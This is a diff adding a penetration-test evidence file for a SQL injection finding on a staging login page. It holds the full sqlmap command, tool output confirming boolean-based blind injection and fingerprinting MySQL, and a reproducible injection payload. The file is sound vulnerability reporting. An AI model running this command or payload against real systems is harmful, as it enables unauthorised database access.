@@ -1,0 +1,21 @@
+# Evidence Artifact: Confirmed SQL injection proof
+# Finding: SQL Injection in username parameter
+# Tool: sqlmap 1.8.3
+
+Command executed:
+sqlmap -u "https://acme-staging.local/login" --data="username=admin&password=test" -p username --batch --risk=2 --level=3 --current-db
+
+Relevant output:
+[10:42:11] [INFO] testing if POST parameter 'username' is dynamic
+[10:42:18] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable
+[10:43:24] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[10:43:25] [INFO] parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+[10:43:27] [INFO] the back-end DBMS is MySQL
+[10:43:28] [INFO] fetching current database
+current database: 'acme_staging'
+
+Confirmed payload:
+username=admin' AND 4251=4251-- -&password=test
+
+Tester conclusion:
+The username parameter in POST /login is confirmed vulnerable to boolean-based blind SQL injection. The proof includes tool confirmation, DBMS fingerprinting, current database retrieval, and a reproducible payload. Screenshot evidence is attached as 09-sqlmap-confirmed-screenshot.png.
